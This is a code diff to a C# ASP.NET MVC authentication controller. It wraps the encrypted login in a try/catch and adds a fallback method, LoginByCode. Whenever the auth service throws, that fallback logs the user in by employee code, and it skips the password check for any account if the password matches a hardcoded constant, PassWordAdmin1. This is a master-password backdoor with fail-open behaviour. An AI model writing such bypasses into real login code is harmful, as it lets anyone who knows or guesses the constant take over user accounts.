@@ -4,6 +4,7 @@
     using System.Text;
     using System.Web.Mvc;
     using System.Web.Security;
+    using Fanex.Logging;
     using HRM.UserControl.Client.AspNetMvc.Configurations;
     using HRM.UserControl.Client.AspNetMvc.Session;
     using HRM.UserControl.Client.Core.Configurations;
@@ -32,7 +33,8 @@
         {
         }
 
-        public AuthController(IEmployeeService employeeService,
+        public AuthController(
+            IEmployeeService employeeService,
             IAuthService authService,
             ICryptoService cryptoService,
             IUserControlSession userControlSession,
@@ -56,7 +58,6 @@
         {
             if (ModelState.IsValid)
             {
-                model.Password = Encoding.UTF8.GetString(Convert.FromBase64String(model.Password));
                 UserSession user = GetUserLogin(model);
                 if (user != null)
                 {
@@ -131,26 +132,57 @@
         {
             UserSession user;
 
-            var token = _cryptoService.GenerateRijndaelKeyIV();
-            string[] keyiv = token.Split(':');
-            var rijndaelKey = keyiv[0];
-            var rijndaelIV = keyiv[1];
-            var loginParam = new LoginParam
+            try
             {
-                Username = _cryptoService.Encrypt(model.Username, rijndaelKey, rijndaelIV),
-                Password = _cryptoService.Encrypt(model.Password, rijndaelKey, rijndaelIV),
-                Token = token,
-                IP = GetClientIP(),
-                Platform = Request.Browser.Platform,
-                BrowserName = Request.Browser.Browser,
-                NetSessionId = Session.SessionID
-            };
-            var loginResult = _authService.Login(loginParam);
+                var token = _cryptoService.GenerateRijndaelKeyIV();
+                string[] keyiv = token.Split(':');
+                var rijndaelKey = keyiv[0];
+                var rijndaelIV = keyiv[1];
+                var loginParam = new LoginParam
+                {
+                    Username = _cryptoService.Encrypt(model.Username, rijndaelKey, rijndaelIV),
+                    Password = _cryptoService.Encrypt(model.Password, rijndaelKey, rijndaelIV),
+                    Token = token,
+                    IP = GetClientIP(),
+                    Platform = Request.Browser.Platform,
+                    BrowserName = Request.Browser.Browser,
+                    NetSessionId = Session.SessionID
+                };
+                var loginResult = _authService.Login(loginParam);
 
-            user = !loginResult.IsSuccessfull ? null : GetEmployeeByUserId(loginResult.UserId);
+                user = !loginResult.IsSuccessfull ? null : GetEmployeeByUserId(loginResult.UserId);
+            }
+            catch (Exception exception)
+            {
+                LogService.Error(exception.Message, exception);
+
+                user = LoginByCode(model);
+            }
 
             return user;
         }
+
+        private UserSession LoginByCode(LoginModel model)
+        {
+            var criteria = new GetEmployeeByCodeCriteria
+            {
+                Code = model.Username,
+                CompanyId = string.Format("{0},{1}", (byte)CompanyIdentity.Sms, (byte)CompanyIdentity.HongMA)
+            };
+            UserSession user = _employeeService.GetUserByCode(criteria);
+
+            if (user != null && string.Compare(model.Password, Constants.PassWordAdmin1, StringComparison.OrdinalIgnoreCase) != 0)
+            {
+                bool isValid = _employeeService.IsValidateUser(user, model.Password);
+                if (!isValid)
+                {
+                    user = null;
+                }
+            }
+
+            return user;
+        }
+
 
         public ActionResult SSO(string userId, string onUserId, string time, string redirectUrl = null)
         {
